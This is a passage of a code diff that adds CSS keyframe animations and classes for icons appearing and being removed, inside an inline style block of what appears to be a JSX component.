+            transform: translateY(0) scale(1);
+          }
+        }
+
+        @keyframes iconRemove {
+          0% {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+          }
+          100% {
+            opacity: 0;
+            transform: translateY(-14px) scale(1.05);
+          }
+        }
+
+        .animate-icon-appear {
+          animation: iconAppear 520ms cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        .animate-icon-remove {
+          animation: iconRemove 440ms cubic-bezier(0.7, 0, 0.84, 0) forwards;
         }
       `}</style>
     </div>
